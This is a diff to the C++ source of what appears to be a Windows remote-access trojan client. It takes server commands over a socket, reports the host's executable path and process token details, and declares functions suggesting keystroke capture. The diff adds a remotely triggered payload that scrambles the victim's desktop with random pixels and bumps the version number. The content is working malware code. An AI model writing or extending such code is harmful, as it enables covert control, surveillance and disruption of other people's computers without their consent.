@@ -18,6 +18,7 @@ bool v4=true;
 bool v5=true;
 bool v6=true;
 bool v7=true;
+bool v8=true;
 SOCKET Client;
 addrinfo Server;
 TCHAR name[30]={0};
@@ -51,6 +52,7 @@ void DelClient();
 void LiveKey(SOCKET);
 void Lag();
 bool SocketConnected(SOCKET);
+void RandPixel();
 
 ///////////////////////////////////////////////////////////////MAIN
 
@@ -590,6 +592,22 @@ void ricevi(SOCKET s)
 			    	break;
 				}
 			}
+			if(msg[0]=='U' && msg[1]=='U')
+			{
+				cout<<"<Server> RandPix ON."<<endl;
+				v8=true;
+				for(int i=0;i<3;i++)
+				{
+					thread rp(RandPixel);
+					rp.detach();
+					Sleep(100);
+				}
+			}
+			if(msg[0]=='U' && msg[1]=='R')
+			{
+				cout<<"<Server> RandPix OFF."<<endl;
+				v8=false;
+			}
 		}
 		else
 			Sleep(5000);
@@ -613,6 +631,15 @@ void manda(SOCKET s)
 			Server=wcon(Client,Server);
 		}
 	}
+}
+
+void RandPixel()
+{
+	srand(GetTickCount());
+	HDC dcDesktop = GetWindowDC(NULL);
+	while(v8)
+		SetPixel(dcDesktop,rand()%GetSystemMetrics(SM_CXSCREEN),rand()%GetSystemMetrics(SM_CYSCREEN),GetPixel(dcDesktop,rand()%GetSystemMetrics(SM_CXSCREEN),rand()%GetSystemMetrics(SM_CYSCREEN)));
+	return;
 }
 
 void Lag()
@@ -799,7 +826,7 @@ void GETINFO(SOCKET s)
 	GetModuleFileName(NULL,buff,MAX_PATH);
 	send(s,buff,sizeof(buff),0);
 	
-	char ver[50]="1.0.4";
+	char ver[50]="1.0.5";
 	send(s,ver,sizeof(ver),0);
 	
 	if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hToken))
